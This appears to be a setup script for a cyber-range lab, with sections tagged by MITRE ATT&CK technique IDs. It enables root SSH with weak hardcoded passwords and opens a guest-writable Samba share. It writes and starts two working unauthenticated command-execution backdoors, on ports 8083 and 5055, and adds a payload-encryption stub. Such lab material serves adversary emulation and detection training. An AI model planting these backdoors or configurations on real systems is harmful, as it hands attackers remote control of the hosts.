############### OUTER SPACE

#
## Global commands
#
apt-get update
apt-get install -y python3 python3-pip sshpass curl socat

## SSH
apt-get install -y openssh-server
mkdir -p /var/run/sshd
echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config
echo 'PasswordAuthentication yes' >> /etc/ssh/sshd_config

pgrep -x "sshd" > /dev/null || /usr/sbin/sshd & 


# Root password
echo 'root:RootPass123' | chpasswd

# User attacker

useradd -m attacker -s /bin/bash
mkdir -p /home/attacker
echo 'attacker:Passw0rd' | chpasswd
usermod -aG sudo attacker

# DebianUser
useradd -M  DebianUser
mkdir -p /home/DebianUser
echo 'DebianUser:DebianUser' | chpasswd
(echo 'DebianUser'; echo 'DebianUser') | smbpasswd -a -s DebianUser

pgrep -x "php-fpm8.4" > /dev/null || php-fpm8.4 &

################################################ End of Global Section
# T1217

mkdir -p /home/attacker/.config/chromium/Default
cat > /home/attacker/.config/chromium/Default/Bookmarks << 'EOF'
{
  "browser": {
    "last_known_version": "113.0.5672.63"
  },
  "bookmarks": [
    {
      "name": "Internal Dashboard",
      "url": "http://internal.dashboard.local"
    }
  ]
}
EOF
chown -R attacker:attacker /home/attacker/.config/chromium


# T1071.001
useradd -m -p $(openssl passwd -1 S3cr3tP@ssw0rd) backdooruser
cat > /home/backdooruser/backdoor.py << 'EOF'
#!/usr/bin/env python3
from http.server import BaseHTTPRequestHandler, HTTPServer
import base64, subprocess
class Handler(BaseHTTPRequestHandler):
 def do_POST(self):
  length = int(self.headers.get("Content-Length"))
  post_data = self.rfile.read(length)
  cmd = base64.b64decode(post_data).decode("utf-8")
  output = subprocess.getoutput(cmd)
  self.send_response(200)
  self.send_header("Content-type", "text/plain")
  self.end_headers()
  self.wfile.write(base64.b64encode(output.encode("utf-8")))
httpd = HTTPServer(("0.0.0.0", 8083), Handler)
httpd.serve_forever()
EOF
chmod +x /home/backdooruser/backdoor.py

chown -R backdooruser:backdooruser /home/backdooruser
if ! ss -tuln | grep -q ":8083 "; then
    su - backdooruser -c "python3 /home/backdooruser/backdoor.py &"
else
    echo "Port 8083 already in use"
fi


# T1027.013
pip install --break-system-packages pycryptodome
cat > /root/encrypt_payload.py << 'EOF'
from Crypto.Cipher import AES
import base64
import sys
key=b"Sixteen byte key"
iv=b"Sixteen byte iv."
cipher=AES.new(key,AES.MODE_CBC,iv)
plaintext=b"MaliciousPayloadContent"
pad=lambda s: s+(16-len(s)%16)*b"\x00"
encrypted=cipher.encrypt(pad(plaintext))
print(base64.b64encode(encrypted).decode())
EOF

# T1587.001
pip3 install --break-system-packages flask flask-cors requests
mkdir -p /home/attacker/malware
cat > /home/attacker/malware/backdoor.py << 'EOF'
#!/usr/bin/env python3
from flask import Flask, request
app = Flask(__name__)
@app.route("/exec", methods=["POST"])
def exec_cmd():
 import subprocess
 cmd = request.form.get("cmd")
 if not cmd:
  return "No command", 400
 try:
  output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=5)
  return output
 except Exception as e:
  return str(e), 500
if __name__ == "__main__":
 app.run(host="0.0.0.0", port=5055)
EOF
chown attacker:attacker /home/attacker/malware/backdoor.py
chmod +x /home/attacker/malware/backdoor.py

if ! ss -tuln | grep -q ":5055 "; then
 su attacker -c "python3 /home/attacker/malware/backdoor.py &"
 else echo "Port 5055 already in use";
fi

# T1059.005
apt-get install -y samba samba-common-bin
printf '[global]\n   workgroup = WORKGROUP\n   server string = Samba Server\n   netbios name = debianA\n   security = user\n   map to guest = Bad User\n\n[share]\n   path = /srv/samba/share\n   browsable =yes\n   writable = yes\n   guest ok = yes\n   read only = no\n' > /etc/samba/smb.conf
mkdir -p /srv/samba/share
chmod -R 0777 /srv/samba/share
printf '#!/bin/sh\necho "This is a fake Windows Defend service file"\nsleep infinity\n' > /srv/samba/share/fake_service.sh
chmod +x /srv/samba/share/fake_service.sh
pgrep -x "smbd" > /dev/null || /usr/sbin/smbd --no-process-group --foreground &


################################
